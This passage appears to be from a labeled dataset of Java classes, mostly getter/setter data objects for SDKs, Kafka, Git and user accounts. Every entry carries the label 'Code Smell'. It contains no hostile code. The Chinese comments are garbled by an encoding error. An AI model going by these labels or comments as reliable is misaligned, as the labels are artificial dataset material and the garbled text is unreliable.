    this.tableFields=tableFields;
  }
  public boolean isDataSequence(){
    return dataSequence;
  }
  public void setDataSequence(  boolean dataSequence){
    this.dataSequence=dataSequence;
  }
  public String getTopic(){
    return topic;
  }
  public void setTopic(  String topic){
    this.topic=topic;
  }
  public List<String> getPartitionKey(){
    return partitionKey;
  }
  public void setPartitionKey(  List<String> partitionKey){
    this.partitionKey=partitionKey;
  }
  public Map<String,String> getKafkaSettings(){
    return kafkaSettings;
  }
  public void setKafkaSettings(  Map<String,String> kafkaSettings){
    this.kafkaSettings=kafkaSettings;
  }
  public String getZookeeperConnect(){
    return zookeeperConnect;
  }
  public void setZookeeperConnect(  String zookeeperConnect){
    this.zookeeperConnect=zookeeperConnect;
  }
  public String getBootstrapServers(){
    return bootstrapServers;
  }
  public void setBootstrapServers(  String bootstrapServers){
    this.bootstrapServers=bootstrapServers;
  }
  public String getCodec(){
    return codec;
  }
  public void setCodec(  String codec){
    this.codec=codec;
  }
}",1,Code Smell
"/** 
 * 鍙戦�佹祦鍋滄浜嬩欢
 */
public class MediaSendRtpStoppedEvent extends ApplicationEvent {
  public MediaSendRtpStoppedEvent(  Object source){
    super(source);
  }
  private String app;
  private String stream;
  private MediaServer mediaServer;
  public static MediaSendRtpStoppedEvent getInstance(  Object source,  OnStreamNotFoundHookParam hookParam,  MediaServer mediaServer){
    MediaSendRtpStoppedEvent mediaDepartureEven=new MediaSendRtpStoppedEvent(source);
    mediaDepartureEven.setApp(hookParam.getApp());
    mediaDepartureEven.setStream(hookParam.getStream());
    mediaDepartureEven.setMediaServer(mediaServer);
    return mediaDepartureEven;
  }
  public String getApp(){
    return app;
  }
  public void setApp(  String app){
    this.app=app;
  }
  public String getStream(){
    return stream;
  }
  public void setStream(  String stream){
    this.stream=stream;
  }
  public MediaServer getMediaServer(){
    return mediaServer;
  }
  public void setMediaServer(  MediaServer mediaServer){
    this.mediaServer=mediaServer;
  }
}
",1,Code Smell
"public static class NET_SMART_KITCHEN_CLOTHES_DETECTION_RULE_INFO extends SdkStructure {
  public int dwSize;
  public int bMaskEnable;
  public int bChefHatEnable;
  public int bChefClothesEnable;
  public int nChefClothesColorNum;
  public int[] emChefClothesColors=new int[8];
  public int nReportInterval;
  public byte[] byReserved=new byte[4096];
  public NET_SMART_KITCHEN_CLOTHES_DETECTION_RULE_INFO(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * CacheCluster
 */
public class CacheClusterObject {
  private String name;
  private String token;
  private String zone;
  private Map<String,String> params=new HashMap<>();
  /** 
 * get name
 * @return the name
 */
  public String getName(){
    return name;
  }
  /** 
 * set name
 * @param name the name to set
 */
  public void setName(  String name){
    this.name=name;
  }
  /** 
 * get zone
 * @return the zone
 */
  public String getZone(){
    return zone;
  }
  /** 
 * set zone
 * @param zone the zone to set
 */
  public void setZone(  String zone){
    this.zone=zone;
  }
  /** 
 * get token
 * @return the token
 */
  public String getToken(){
    return token;
  }
  /** 
 * set token
 * @param token the token to set
 */
  public void setToken(  String token){
    this.token=token;
  }
  /** 
 * get params
 * @return the params
 */
  public Map<String,String> getParams(){
    return params;
  }
  /** 
 * set params
 * @param params the params to set
 */
  public void setParams(  Map<String,String> params){
    this.params=params;
  }
}
",1,Code Smell
"@ConfigurationProperties(prefix=""magic-api.resource.git"") public class MagicGitProperties {
  /** 
 * git浠撳簱鍦板潃
 */
  private String url;
  /** 
 * git鍒嗘敮
 */
  private String branch;
  /** 
 * ssh 瀵嗛挜鍦板潃 浠呮敮鎸�-m PEM鍙傛暟鐢熶骇鐨剆sh key
 */
  private String privateKey;
  /** 
 * git璐﹀彿
 */
  private String username;
  /** 
 * git瀵嗙爜
 */
  private String password;
  public String getUrl(){
    return url;
  }
  public void setUrl(  String url){
    this.url=url;
  }
  public String getBranch(){
    return branch;
  }
  public void setBranch(  String branch){
    this.branch=branch;
  }
  public String getPrivateKey(){
    return privateKey;
  }
  public void setPrivateKey(  String privateKey){
    this.privateKey=privateKey;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
}
",1,Code Smell
"/** 
 * 搴旂敤妯″潡: <p> 绫绘弿杩�: 鐢ㄦ埛淇℃伅 <p>
 * @author darryrzhoong
 * @since 2020-01-27
 */
public class UserInfo implements Serializable {
  @NonNull private String uuid;
  private String birthday;
  private String sex;
  private String accessToken;
  private String refreshToken;
  private String tokenExpireTime;
  private int type;
  private String name;
  private String email;
  private String phone;
  private String signature;
  private String avatarRemoteUrl;
  private ThirdAccount[] thirdAccounts;
  private String regionId;
public class ThirdAccount implements Serializable {
    public String avatarUrl;
    public String nickName;
    public String openId;
    public int thirdType;
    public String token;
    public String unionId;
    public String email;
  }
  private UserInfo(){
    throw new UnsupportedOperationException(""Do not instantiate"");
  }
  public static UserInfo getInstance(){
    return UserHolder.INSTANCE;
  }
private static class UserHolder {
    private static final UserInfo INSTANCE=new UserInfo();
  }
  @NonNull public String getUuid(){
    return uuid;
  }
  public void setUuid(  @NonNull String uuid){
    this.uuid=uuid;
  }
  public String getBirthday(){
    return birthday;
  }
  public void setBirthday(  String birthday){
    this.birthday=birthday;
  }
  public String getSex(){
    return sex;
  }
  public void setSex(  String sex){
    this.sex=sex;
  }
  public String getAccessToken(){
    return accessToken;
  }
  public void setAccessToken(  String accessToken){
    this.accessToken=accessToken;
  }
  public String getRefreshToken(){
    return refreshToken;
  }
  public void setRefreshToken(  String refreshToken){
    this.refreshToken=refreshToken;
  }
  public String getTokenExpireTime(){
    return tokenExpireTime;
  }
  public void setTokenExpireTime(  String tokenExpireTime){
    this.tokenExpireTime=tokenExpireTime;
  }
  public int getType(){
    return type;
  }
  public void setType(  int type){
    this.type=type;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getEmail(){
    return email;
  }
  public void setEmail(  String email){
    this.email=email;
  }
  public String getPhone(){
    return phone;
  }
  public void setPhone(  String phone){
    this.phone=phone;
  }
  public String getSignature(){
    return signature;
  }
  public void setSignature(  String signature){
    this.signature=signature;
  }
  public String getAvatarRemoteUrl(){
    return avatarRemoteUrl;
  }
  public void setAvatarRemoteUrl(  String avatarRemoteUrl){
    this.avatarRemoteUrl=avatarRemoteUrl;
  }
  public ThirdAccount[] getThirdAccounts(){
    return thirdAccounts;
  }
  public void setThirdAccounts(  ThirdAccount[] thirdAccounts){
    this.thirdAccounts=thirdAccounts;
  }
  public String getRegionId(){
    return regionId;
  }
  public void setRegionId(  String regionId){
    this.regionId=regionId;
  }
}",1,Code Smell
"public class AccountTreeDTO {
  private List<ProjectVo> projectVoList;
  private List<ServerVo> serverAccount;
  private List<ImageVo> imageAccount;
  private List<CodeVo> codeAccount;
  private List<K8sVo> k8sAccount;
  private List<ConfigVo> configAccount;
  private List<FileSystemVo> fsAccount;
  public List<ProjectVo> getProjectVoList(){
    return projectVoList;
  }
  public void setProjectVoList(  List<ProjectVo> projectVoList){
    this.projectVoList=projectVoList;
  }
  public List<ServerVo> getServerAccount(){
    return serverAccount;
  }
  public void setServerAccount(  List<ServerVo> serverAccount){
    this.serverAccount=serverAccount;
  }
  public List<ImageVo> getImageAccount(){
    return imageAccount;
  }
  public void setImageAccount(  List<ImageVo> imageAccount){
    this.imageAccount=imageAccount;
  }
  public List<CodeVo> getCodeAccount(){
    return codeAccount;
  }
  public void setCodeAccount(  List<CodeVo> codeAccount){
    this.codeAccount=codeAccount;
  }
  public List<K8sVo> getK8sAccount(){
    return k8sAccount;
  }
  public void setK8sAccount(  List<K8sVo> k8sAccount){
    this.k8sAccount=k8sAccount;
  }
  public List<ConfigVo> getConfigAccount(){
    return configAccount;
  }
  public void setConfigAccount(  List<ConfigVo> configAccount){
    this.configAccount=configAccount;
  }
  public List<FileSystemVo> getFsAccount(){
    return fsAccount;
  }
  public void setFsAccount(  List<FileSystemVo> fsAccount){
    this.fsAccount=fsAccount;
  }
}",1,Code Smell
"public static class EVENT_INFO extends SdkStructure {
  public int nEvent;
  public int[] arrayObejctType=new int[16];
  public int nObjectCount;
  public byte[] byReserved=new byte[512];
}",1,Code Smell
"public final class EmojiReplyElement implements Serializable {
  int emojiId;
  int emojiType;
  long msgId;
  long msgSeq;
  long serialVersionUID=1;
  long tinyId;
  public EmojiReplyElement(){
  }
  public int getEmojiId(){
    return this.emojiId;
  }
  public int getEmojiType(){
    return this.emojiType;
  }
  public long getMsgId(){
    return this.msgId;
  }
  public long getMsgSeq(){
    return this.msgSeq;
  }
  public long getTinyId(){
    return this.tinyId;
  }
  public String toString(){
    return ""EmojiReplyElement{tinyId="" + this.tinyId + "",msgSeq=""+ this.msgSeq+ "",msgId=""+ this.msgId+ "",emojiId=""+ this.emojiId+ "",emojiType=""+ this.emojiType+ "",}"";
  }
  public EmojiReplyElement(  long j2,  long j3,  long j4,  int i2,  int i3){
    this.tinyId=j2;
    this.msgSeq=j3;
    this.msgId=j4;
    this.emojiId=i2;
    this.emojiType=i3;
  }
}",1,Code Smell
"/** 
 * 妯″潡鏉冮檺闆嗐
 * @author datagear@163.com
 */
public class ModulePermissions implements Serializable {
  private static final long serialVersionUID=1L;
  private ModulePermission schemaPermission;
  private ModulePermission analysisProjectPermission;
  private ModulePermission dataSetPermission;
  private ModulePermission chartPermission;
  private ModulePermission dashboardPermission;
  public ModulePermissions(){
    super();
  }
  public ModulePermissions(  ModulePermission schemaPermission,  ModulePermission analysisProjectPermission,  ModulePermission dataSetPermission,  ModulePermission chartPermission,  ModulePermission dashboardPermission){
    super();
    this.schemaPermission=schemaPermission;
    this.analysisProjectPermission=analysisProjectPermission;
    this.dataSetPermission=dataSetPermission;
    this.chartPermission=chartPermission;
    this.dashboardPermission=dashboardPermission;
  }
  public ModulePermission getSchemaPermission(){
    return schemaPermission;
  }
  public void setSchemaPermission(  ModulePermission schemaPermission){
    this.schemaPermission=schemaPermission;
  }
  public ModulePermission getAnalysisProjectPermission(){
    return analysisProjectPermission;
  }
  public void setAnalysisProjectPermission(  ModulePermission analysisProjectPermission){
    this.analysisProjectPermission=analysisProjectPermission;
  }
  public ModulePermission getDataSetPermission(){
    return dataSetPermission;
  }
  public void setDataSetPermission(  ModulePermission dataSetPermission){
    this.dataSetPermission=dataSetPermission;
  }
  public ModulePermission getChartPermission(){
    return chartPermission;
  }
  public void setChartPermission(  ModulePermission chartPermission){
    this.chartPermission=chartPermission;
  }
  public ModulePermission getDashboardPermission(){
    return dashboardPermission;
  }
  public void setDashboardPermission(  ModulePermission dashboardPermission){
    this.dashboardPermission=dashboardPermission;
  }
}",1,Code Smell
"/** 
 * 瑙嗛杈撳叆淇℃伅
 * @author 锛� 47040
 * @since 锛� Created in 2020/8/13 10:29 EM_VIDEOINPUTS_SERVICE_TYPE
 */
public class NET_CUSTOM_DEV_VIDEO_INPUTS extends NetSDKLib.SdkStructure {
  /** 
 * 涓荤爜娴乁RL鍦板潃锛堟敞锛氭帴鍏ヨ澶囧崗璁被鍨嬩负General鏃舵湁鏁堬紝姝ゆ椂涓昏緟鐮佹祦URL涓嶈兘鍚屾椂涓虹┖锛� 
 */
  public byte[] szMainStreamUrl=new byte[256];
  /** 
 * 杈呯爜娴乁RL鍦板潃锛堟敞锛氭帴鍏ヨ澶囧崗璁被鍨嬩负General鏃舵湁鏁堬紝姝ゆ椂涓昏緟鐮佹祦URL涓嶈兘鍚屾椂涓虹┖锛� 
 */
  public byte[] szExtraStreamUrl=new byte[256];
  /** 
 * 鏈嶅姟绫诲瀷锛屽搴旀灇涓緖@link EM_VIDEOINPUTS_SERVICE_TYPE} 
 */
  public int emServiceType;
  /** 
 * 棰勭暀瀛楄妭 
 */
  public byte[] byReserved=new byte[508];
}",1,Code Smell
"public final class GProGuildMsg {
  long channelId;
  long guildId;
  ArrayList<GProMsgHighlight> highlights;
  long msgSeq;
  public GProGuildMsg(){
    this.highlights=new ArrayList<>();
  }
  public long getChannelId(){
    return this.channelId;
  }
  public long getGuildId(){
    return this.guildId;
  }
  public ArrayList<GProMsgHighlight> getHighlights(){
    return this.highlights;
  }
  public long getMsgSeq(){
    return this.msgSeq;
  }
  public String toString(){
    return ""GProGuildMsg{guildId="" + this.guildId + "",channelId=""+ this.channelId+ "",msgSeq=""+ this.msgSeq+ "",highlights=""+ this.highlights+ "",}"";
  }
  public GProGuildMsg(  long j2,  long j3,  long j4,  ArrayList<GProMsgHighlight> arrayList){
    this.highlights=new ArrayList<>();
    this.guildId=j2;
    this.channelId=j3;
    this.msgSeq=j4;
    this.highlights=arrayList;
  }
}",1,Code Smell
"public static class Encoding {
  @Nullable public String rid;
  public boolean active=true;
  public double bitratePriority=1.0;
  public int networkPriority=0;
  @Nullable public Integer maxBitrateBps;
  @Nullable public Integer minBitrateBps;
  @Nullable public Integer maxFramerate;
  @Nullable public Integer numTemporalLayers;
  @Nullable public Double scaleResolutionDownBy;
  public Long ssrc;
  public Encoding(  String rid,  boolean active,  Double scaleResolutionDownBy){
    this.rid=rid;
    this.active=active;
    this.scaleResolutionDownBy=scaleResolutionDownBy;
  }
  @CalledByNative(""Encoding"") Encoding(  String rid,  boolean active,  double bitratePriority,  int networkPriority,  Integer maxBitrateBps,  Integer minBitrateBps,  Integer maxFramerate,  Integer numTemporalLayers,  Double scaleResolutionDownBy,  Long ssrc){
    this.rid=rid;
    this.active=active;
    this.bitratePriority=bitratePriority;
    this.networkPriority=networkPriority;
    this.maxBitrateBps=maxBitrateBps;
    this.minBitrateBps=minBitrateBps;
    this.maxFramerate=maxFramerate;
    this.numTemporalLayers=numTemporalLayers;
    this.scaleResolutionDownBy=scaleResolutionDownBy;
    this.ssrc=ssrc;
  }
  @Nullable @CalledByNative(""Encoding"") String getRid(){
    return rid;
  }
  @CalledByNative(""Encoding"") boolean getActive(){
    return active;
  }
  @CalledByNative(""Encoding"") double getBitratePriority(){
    return bitratePriority;
  }
  @CalledByNative(""Encoding"") int getNetworkPriority(){
    return networkPriority;
  }
  @Nullable @CalledByNative(""Encoding"") Integer getMaxBitrateBps(){
    return maxBitrateBps;
  }
  @Nullable @CalledByNative(""Encoding"") Integer getMinBitrateBps(){
    return minBitrateBps;
  }
  @Nullable @CalledByNative(""Encoding"") Integer getMaxFramerate(){
    return maxFramerate;
  }
  @Nullable @CalledByNative(""Encoding"") Integer getNumTemporalLayers(){
    return numTemporalLayers;
  }
  @Nullable @CalledByNative(""Encoding"") Double getScaleResolutionDownBy(){
    return scaleResolutionDownBy;
  }
  @CalledByNative(""Encoding"") Long getSsrc(){
    return ssrc;
  }
}",1,Code Smell
"/** 
 * 鐢ㄤ簬瑙ｆ瀽RuleSourceExtData鐨剉o绫伙紝鐢ㄤ簬zk妯″紡涓�
 * @author Bryan.Zhang
 * @since 2.8.6
 */
public class ZkParserVO {
  private String connectStr;
  private String chainPath;
  private String scriptPath;
  public String getConnectStr(){
    return connectStr;
  }
  public void setConnectStr(  String connectStr){
    this.connectStr=connectStr;
  }
  public String getChainPath(){
    return chainPath;
  }
  public void setChainPath(  String chainPath){
    this.chainPath=chainPath;
  }
  public String getScriptPath(){
    return scriptPath;
  }
  public void setScriptPath(  String scriptPath){
    this.scriptPath=scriptPath;
  }
}",1,Code Smell
"public static class EM_REMOTE_UPGRADE_STATE extends SdkStructure {
  public static final int EM_REMOTE_UPGRADE_STATE_UNKNOWN=0;
  public static final int EM_REMOTE_UPGRADE_STATE_INIT=1;
  public static final int EM_REMOTE_UPGRADE_STATE_DOWNLOADING=2;
  public static final int EM_REMOTE_UPGRADE_STATE_UPGRADING=3;
  public static final int EM_REMOTE_UPGRADE_STATE_FAILED=4;
  public static final int EM_REMOTE_UPGRADE_STATE_SUCCEEDED=5;
  public static final int EM_REMOTE_UPGRADE_STATE_CANCELLED=6;
  public static final int EM_REMOTE_UPGRADE_STATE_PREPARING=7;
}",1,Code Smell
"public static class MEDIAFILE_TRAFFICCAR_INFO_EX extends SdkStructure {
  public int dwSize;
  public MEDIAFILE_TRAFFICCAR_INFO stuInfo;
  public byte[] szDeviceAddr=new byte[NET_COMMON_STRING_256];
  public byte[] szVehicleSign=new byte[NET_COMMON_STRING_32];
  public byte[] szCustomParkNo=new byte[NET_COMMON_STRING_64];
  public short wVehicleSubBrand;
  public short wVehicleYearModel;
  public NET_TIME stuEleTagInfoUTC;
  public int[] emFalgLists=new int[EM_RECORD_SNAP_FLAG_TYPE.FLAG_TYPE_MAX];
  public int nFalgCount;
  public int emSafeBelSate;
  public int emCallingState;
  public int nAttachMentNum;
  public NET_ATTACH_MENET_INFO[] stuAttachMent=(NET_ATTACH_MENET_INFO[])new NET_ATTACH_MENET_INFO().toArray(MAX_ATTACHMENT_NUM);
  public byte[] szCountry=new byte[NET_COMMON_STRING_32];
  public int emCarType;
  public int emSunShadeState;
  public int emSmokingState;
  public int nAnnualInspection;
  public byte[] byReserved=new byte[4];
  public int nPicIDHigh;
  public int nPicIDLow;
  public NET_UPLOAD_CLIENT_INFO stuClient1;
  public NET_UPLOAD_CLIENT_INFO stuClient2;
  public PlateNumber[] szExtraPlateNumber=(PlateNumber[])new PlateNumber().toArray(3);
  public int nExtraPlateNumberNum;
  public MEDIAFILE_TRAFFICCAR_INFO_EX(){
    this.dwSize=this.size();
  }
}",1,Code Smell
"/** 
 * <p> 鐢ㄦ埛闃呰鍘嗗彶 </p>
 * @author xiongxiaoyang
 * @date 2022/05/11
 */
@TableName(""user_read_history"") public class UserReadHistory implements Serializable {
  private static final long serialVersionUID=1L;
  /** 
 * 涓婚敭
 */
  @TableId(value=""id"",type=IdType.AUTO) private Long id;
  /** 
 * 鐢ㄦ埛ID
 */
  private Long userId;
  /** 
 * 灏忚ID
 */
  private Long bookId;
  /** 
 * 涓婁竴娆￠槄璇荤殑绔犺妭鍐呭琛↖D
 */
  private Long preContentId;
  /** 
 * 鍒涘缓鏃堕棿;
 */
  private LocalDateTime createTime;
  /** 
 * 鏇存柊鏃堕棿;
 */
  private LocalDateTime updateTime;
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public Long getUserId(){
    return userId;
  }
  public void setUserId(  Long userId){
    this.userId=userId;
  }
  public Long getBookId(){
    return bookId;
  }
  public void setBookId(  Long bookId){
    this.bookId=bookId;
  }
  public Long getPreContentId(){
    return preContentId;
  }
  public void setPreContentId(  Long preContentId){
    this.preContentId=preContentId;
  }
  public LocalDateTime getCreateTime(){
    return createTime;
  }
  public void setCreateTime(  LocalDateTime createTime){
    this.createTime=createTime;
  }
  public LocalDateTime getUpdateTime(){
    return updateTime;
  }
  public void setUpdateTime(  LocalDateTime updateTime){
    this.updateTime=updateTime;
  }
  @Override public String toString(){
    return ""UserReadHistory{"" + ""id="" + id + "", userId=""+ userId+ "", bookId=""+ bookId+ "", preContentId=""+ preContentId+ "", createTime=""+ createTime+ "", updateTime=""+ updateTime+ ""}"";
  }
}",1,Code Smell
"public class ColumnRenameInfo implements Writable {
  @SerializedName(""db"") private long dbId;
  @SerializedName(""tb"") private long tableId;
  @SerializedName(""cn"") private String columnName;
  @SerializedName(""ncn"") private String newColumnName;
  public ColumnRenameInfo(){
  }
  public long getDbId(){
    return dbId;
  }
  public void setDbId(  long dbId){
    this.dbId=dbId;
  }
  public long getTableId(){
    return tableId;
  }
  public String getColumnName(){
    return columnName;
  }
  public String getNewColumnName(){
    return newColumnName;
  }
  public ColumnRenameInfo(  long dbId,  long tableId,  String columnName,  String newColumnName){
    this.dbId=dbId;
    this.tableId=tableId;
    this.columnName=columnName;
    this.newColumnName=newColumnName;
  }
  @Override public void write(  DataOutput out) throws IOException {
    Text.writeString(out,GsonUtils.GSON.toJson(this));
  }
  public static ColumnRenameInfo read(  DataInput in) throws IOException {
    return GsonUtils.GSON.fromJson(Text.readString(in),ColumnRenameInfo.class);
  }
}
",1,Code Smell
"@Data public class AzureChatCompletions {
  private String id;
  private int created;
  @JsonProperty(value=""choices"") private List<AzureChatChoice> choices;
  private AzureCompletionsUsage usage;
  /** 
 * Creates an instance of ChatCompletions class.
 * @param id the id value to set.
 * @param created the created value to set.
 * @param choices the choices value to set.
 * @param usage the usage value to set.
 */
  @JsonCreator private AzureChatCompletions(  @JsonProperty(value=""id"") String id,  @JsonProperty(value=""created"") int created,  @JsonProperty(value=""choices"") List<AzureChatChoice> choices,  @JsonProperty(value=""usage"") AzureCompletionsUsage usage){
    this.id=id;
    this.created=created;
    this.choices=choices;
    this.usage=usage;
  }
  /** 
 * Get the id property: A unique identifier associated with this chat completions response.
 * @return the id value.
 */
  public String getId(){
    return this.id;
  }
  /** 
 * Get the created property: The first timestamp associated with generation activity for this completions response, represented as seconds since the beginning of the Unix epoch of 00:00 on 1 Jan 1970.
 * @return the created value.
 */
  public int getCreated(){
    return this.created;
  }
  /** 
 * Get the choices property: The collection of completions choices associated with this completions response. Generally, `n` choices are generated per provided prompt with a default value of 1. Token limits and other settings may limit the number of choices generated.
 * @return the choices value.
 */
  public List<AzureChatChoice> getChoices(){
    return this.choices;
  }
  /** 
 * Get the usage property: Usage information for tokens processed and generated as part of this completions operation.
 * @return the usage value.
 */
  public AzureCompletionsUsage getUsage(){
    return this.usage;
  }
}",1,Code Smell
"public class MysqlServerStatusFlag {
  public static final int SERVER_STATUS_IN_TRANS=0x0001;
  public static final int SERVER_STATUS_AUTOCOMMIT=0x0002;
  public static final int SERVER_MORE_RESULTS_EXISTS=0x0008;
  public static final int SERVER_STATUS_NO_GOOD_INDEX_USED=0x0010;
  public static final int SERVER_STATUS_NO_INDEX_USED=0x0020;
  public static final int SERVER_STATUS_CURSOR_EXISTS=0x0040;
  public static final int SERVER_STATUS_LAST_ROW_SENT=0x0080;
  public static final int SERVER_STATUS_DB_DROPPED=0x0100;
  public static final int SERVER_STATUS_NO_BACKSLASH_ESCAPES=0x0200;
  public static final int SERVER_STATUS_METADATA_CHANGED=0x0400;
  public static final int SERVER_QUERY_WAS_SLOW=0x0800;
  public static final int SERVER_PS_OUT_PARAMS=0x1000;
  public static final int SERVER_STATUS_IN_TRANS_READONLY=0x2000;
  public static final int SERVER_SESSION_STATE_CHANGED=0x4000;
}",1,Code Smell
"public abstract class Piece {
  private boolean killed=false;
  private boolean white=false;
  public Piece(  boolean white){
    this.setWhite(white);
  }
  public boolean isWhite(){
    return this.white == true;
  }
  public void setWhite(  boolean white){
    this.white=white;
  }
  public boolean isKilled(){
    return this.killed == true;
  }
  public void setKilled(  boolean killed){
    this.killed=killed;
  }
  public abstract boolean canMove(  Board board,  Box start,  Box end);
}
",1,Code Smell
"public class CivilCodePo {
  private String code;
  private String name;
  private String parentCode;
  public static CivilCodePo getInstance(  String[] infoArray){
    CivilCodePo civilCodePo=new CivilCodePo();
    civilCodePo.setCode(infoArray[0]);
    civilCodePo.setName(infoArray[1]);
    civilCodePo.setParentCode(infoArray[2]);
    return civilCodePo;
  }
  public String getCode(){
    return code;
  }
  public void setCode(  String code){
    this.code=code;
  }
  public String getName(){
    return name;
  }
  public void setName(  String name){
    this.name=name;
  }
  public String getParentCode(){
    return parentCode;
  }
  public void setParentCode(  String parentCode){
    this.parentCode=parentCode;
  }
}",1,Code Smell
"public static class NET_DVR_DEVICEINFO_V30 extends Structure {
  public byte[] sSerialNumber=new byte[SERIALNO_LEN];
  public byte byAlarmInPortNum;
  public byte byAlarmOutPortNum;
  public byte byDiskNum;
  public byte byDVRType;
  public byte byChanNum;
  public byte byStartChan;
  public byte byAudioChanNum;
  public byte byIPChanNum;
  public byte byZeroChanNum;
  public byte byMainProto;
  public byte bySubProto;
  public byte bySupport;
  public byte bySupport1;
  public byte bySupport2;
  public short wDevType;
  public byte bySupport3;
  public byte byMultiStreamProto;
  public byte byStartDChan;
  public byte byStartDTalkChan;
  public byte byHighDChanNum;
  public byte bySupport4;
  public byte byLanguageType;
  public byte byVoiceInChanNum;
  public byte byStartVoiceInChanNo;
  public byte bySupport5;
  public byte bySupport6;
  public byte byMirrorChanNum;
  public short wStartMirrorChanNo;
  public byte bySupport7;
  public byte byRes2;
}",1,Code Smell
"/** 
 * JobParam
 * @since 2021/11/16
 */
@Data public class JobParam {
  private List<String> statements;
  private List<StatementParam> ddl;
  private List<StatementParam> trans;
  private List<StatementParam> execute;
  private List<UDF> udfList;
  private String parsedSql;
  public JobParam(  List<UDF> udfList){
    this.udfList=udfList;
  }
  public JobParam(  List<StatementParam> ddl,  List<StatementParam> trans){
    this.ddl=ddl;
    this.trans=trans;
  }
  public JobParam(  List<String> statements,  List<StatementParam> ddl,  List<StatementParam> trans,  List<StatementParam> execute){
    this.statements=statements;
    this.ddl=ddl;
    this.trans=trans;
    this.execute=execute;
  }
  public JobParam(  List<String> statements,  List<StatementParam> ddl,  List<StatementParam> trans,  List<StatementParam> execute,  List<UDF> udfList,  String parsedSql){
    this.statements=statements;
    this.ddl=ddl;
    this.trans=trans;
    this.execute=execute;
    this.udfList=udfList;
    this.parsedSql=parsedSql;
  }
  public List<String> getStatements(){
    return statements;
  }
  public void setStatements(  List<String> statements){
    this.statements=statements;
  }
  public List<StatementParam> getDdl(){
    return ddl;
  }
  public void setDdl(  List<StatementParam> ddl){
    this.ddl=ddl;
  }
  public List<StatementParam> getTrans(){
    return trans;
  }
  public List<String> getTransStatement(){
    return trans.stream().map(StatementParam::getValue).collect(Collectors.toList());
  }
  public void setTrans(  List<StatementParam> trans){
    this.trans=trans;
  }
  public List<StatementParam> getExecute(){
    return execute;
  }
  public void setExecute(  List<StatementParam> execute){
    this.execute=execute;
  }
  public List<UDF> getUdfList(){
    return udfList;
  }
}",1,Code Smell
"/** 
 * All internalized xml symbols. They can be compared using ""=="".
 * @author Sandy Gao, IBM
 */
public class XMLSymbols {
  public XMLSymbols(){
  }
  /** 
 * The empty string.
 */
  public final static String EMPTY_STRING="""".intern();
  /** 
 * The internalized ""xml"" prefix.
 */
  public final static String PREFIX_XML=""xml"".intern();
  /** 
 * The internalized ""xmlns"" prefix.
 */
  public final static String PREFIX_XMLNS=""xmlns"".intern();
  /** 
 * Symbol: ""ANY"". 
 */
  public static final String fANYSymbol=""ANY"".intern();
  /** 
 * Symbol: ""CDATA"". 
 */
  public static final String fCDATASymbol=""CDATA"".intern();
  /** 
 * Symbol: ""ID"". 
 */
  public static final String fIDSymbol=""ID"".intern();
  /** 
 * Symbol: ""IDREF"". 
 */
  public static final String fIDREFSymbol=""IDREF"".intern();
  /** 
 * Symbol: ""IDREFS"". 
 */
  public static final String fIDREFSSymbol=""IDREFS"".intern();
  /** 
 * Symbol: ""ENTITY"". 
 */
  public static final String fENTITYSymbol=""ENTITY"".intern();
  /** 
 * Symbol: ""ENTITIES"". 
 */
  public static final String fENTITIESSymbol=""ENTITIES"".intern();
  /** 
 * Symbol: ""NMTOKEN"". 
 */
  public static final String fNMTOKENSymbol=""NMTOKEN"".intern();
  /** 
 * Symbol: ""NMTOKENS"". 
 */
  public static final String fNMTOKENSSymbol=""NMTOKENS"".intern();
  /** 
 * Symbol: ""NOTATION"". 
 */
  public static final String fNOTATIONSymbol=""NOTATION"".intern();
  /** 
 * Symbol: ""ENUMERATION"". 
 */
  public static final String fENUMERATIONSymbol=""ENUMERATION"".intern();
  /** 
 * Symbol: ""#IMPLIED. 
 */
  public static final String fIMPLIEDSymbol=""#IMPLIED"".intern();
  /** 
 * Symbol: ""#REQUIRED"". 
 */
  public static final String fREQUIREDSymbol=""#REQUIRED"".intern();
  /** 
 * Symbol: ""#FIXED"". 
 */
  public static final String fFIXEDSymbol=""#FIXED"".intern();
}
",1,Code Smell
"class RegionsSummary {
  private int youngRegionsStatistics;
  private int youngRegionsCount;
  private int humonguousRegionsStatistics;
  private int humonguousRegionsCount;
  private int freeRegionsStatistics;
  private int freeRegionsCount;
  private int oldRegionsStatistics;
  private int oldRegionsCount;
  RegionsSummary(){
  }
  void setYoungRegionsStatistics(  int value){
    youngRegionsStatistics=value;
  }
  void setYoungRegionsCount(  int value){
    youngRegionsCount=value;
  }
  void setHumonguousRegionsStatistics(  int value){
    humonguousRegionsStatistics=value;
  }
  void setHumonguousRegionsCount(  int value){
    humonguousRegionsCount=value;
  }
  void setFreeRegionsStatistics(  int value){
    freeRegionsStatistics=value;
  }
  void setFreeRegionsCount(  int value){
    freeRegionsCount=value;
  }
  void setOldRegionsStatistics(  int value){
    oldRegionsStatistics=value;
  }
  void setOldRegionsCount(  int value){
    oldRegionsCount=value;
  }
  int getYoungRegionsStatistics(){
    return youngRegionsStatistics;
  }
  int getYoungRegionsCount(){
    return youngRegionsCount;
  }
  int getHumonguousRegionsStatistics(){
    return humonguousRegionsStatistics;
  }
  int getHumonguousRegionsCount(){
    return humonguousRegionsCount;
  }
  int getFreeRegionsStatistics(){
    return freeRegionsStatistics;
  }
  int getFreeRegionsCount(){
    return freeRegionsCount;
  }
  int getOldRegionsStatistics(){
    return oldRegionsStatistics;
  }
  int getOldRegionsCount(){
    return oldRegionsCount;
  }
}
",1,Code Smell
"@Schema(description=""绠＄悊鍚庡彴 - 鍟嗗搧 SPU 鍒嗛〉 Request VO"") @Data @EqualsAndHashCode(callSuper=true) @ToString(callSuper=true) public class ProductSpuPageReqVO extends PageParam {
  /** 
 * 鍑哄敭涓晢鍝�
 */
  public static final Integer FOR_SALE=0;
  /** 
 * 浠撳簱涓晢鍝�
 */
  public static final Integer IN_WAREHOUSE=1;
  /** 
 * 宸插敭绌哄晢鍝�
 */
  public static final Integer SOLD_OUT=2;
  /** 
 * 璀︽垝搴撳瓨
 */
  public static final Integer ALERT_STOCK=3;
  /** 
 * 鍟嗗搧鍥炴敹绔�
 */
  public static final Integer RECYCLE_BIN=4;
  @Schema(description=""鍟嗗搧鍚嶇О"",example=""娓呭噳灏忕煭琚�"") private String name;
